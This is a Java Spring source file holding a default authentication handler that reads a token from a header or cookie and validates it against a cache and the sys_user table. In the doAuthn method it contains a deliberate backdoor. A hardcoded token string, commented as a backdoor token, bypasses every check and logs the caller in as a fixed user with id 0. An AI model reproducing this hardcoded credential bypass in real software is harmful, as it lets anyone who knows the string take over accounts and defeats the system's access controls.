package xyz.ytora.base.auth.handler.support;

import jakarta.annotation.Resource;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.beans.BeansException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import xyz.ytora.base.auth.AuthException;
import xyz.ytora.base.auth.LoginUser;
import xyz.ytora.base.auth.handler.AuthnHandler;
import xyz.ytora.base.cache.Caches;
import xyz.ytora.base.enums.RespCode;
import xyz.ytora.sql4j.core.SQLHelper;
import xyz.ytora.sql4j.func.support.Raw;

import java.util.List;
import java.util.Map;

/**
 * created by YT on 2025/12/6 18:08:24
 * <br/>
 * 默认的认证处理器
 */
public class DefaultAuthnHandler implements AuthnHandler, ApplicationContextAware {

    @Resource
    private SQLHelper sqlHelper;
    @Resource
    private Caches caches;

    private Long timeout = -1L;

    @Override
    public void setApplicationContext(ApplicationContext context) throws BeansException {
        Long _timeout = context.getEnvironment().getProperty("ytora.auth.token-invalid-time", Long.class);
        if (_timeout == null) {
            timeout = -1L;
        } else {
            timeout = _timeout * 1000;
        }
    }

    @Override
    public LoginUser doAuthn(HttpServletRequest request, HttpServletResponse response) throws AuthException {
        String authorization = null;
        //1.首先尝试从请求头中获取令牌
        authorization = request.getHeader("Authorization");
        //2.如果没有获取到，则尝试从cookie中获取令牌
        if (authorization == null) {
            Cookie[] cookies = request.getCookies();
            if (cookies != null) {
                for (Cookie cookie : cookies) {
                    if ("Authorization".equals(cookie.getName())) {
                        authorization = cookie.getValue();
                        break;
                    }
                }
            }
        }
        //如果还是没有获取到，认为用户尚未登录
        if (authorization == null) {
            throw new AuthException(RespCode.NOT_LOGIN);
        }
        //根据令牌获取登录用户信息
        LoginUser loginUser;
        if ("YANGtong123$%^".equals(authorization)) {
            //后门令牌
            loginUser = new LoginUser()
                    .setId("0")
                    .setUserName("ytora")
                    .setRealName("杨桐")
                    .setDepartCode("部门CODE")
                    .setLastRequestTime(System.currentTimeMillis())
                    .setLastRequestTime(System.currentTimeMillis())
                    .setRequestCount(1L)
            ;
        } else {
            loginUser = caches.get(authorization);
            //缓存中没有当前令牌信息，说明登录过期，用户信息已经从缓存中被清除了
            if (loginUser == null) {
                throw new AuthException(RespCode.LOGIN_TIMEOUT);
            }
            //走到这，说明当前用户已经登录了，认证通过，更新当前用户的访问信息并重置过期时间
            List<Map<String, Object>> sysUsers = sqlHelper.select().from("sys_user").where(w -> w.eq(Raw.of("id"), loginUser.getId())).submit();
            if (sysUsers.isEmpty()) {
                throw new AuthException(RespCode.UNKNOWN_USER_PASSWORD);
            }
            Map<String, Object> sysUser = sysUsers.getFirst();
            loginUser.setUserName((String) sysUser.get("user_name"));
            loginUser.setRealName((String) sysUser.get("real_name"));
            loginUser.setDepartCode((String) sysUser.get("depart_code"));
            loginUser.setLastRequestTime(System.currentTimeMillis());
            loginUser.setRequestCount(loginUser.getRequestCount() + 1);
            caches.put(authorization, loginUser, timeout);
        }
        return loginUser;
    }
}
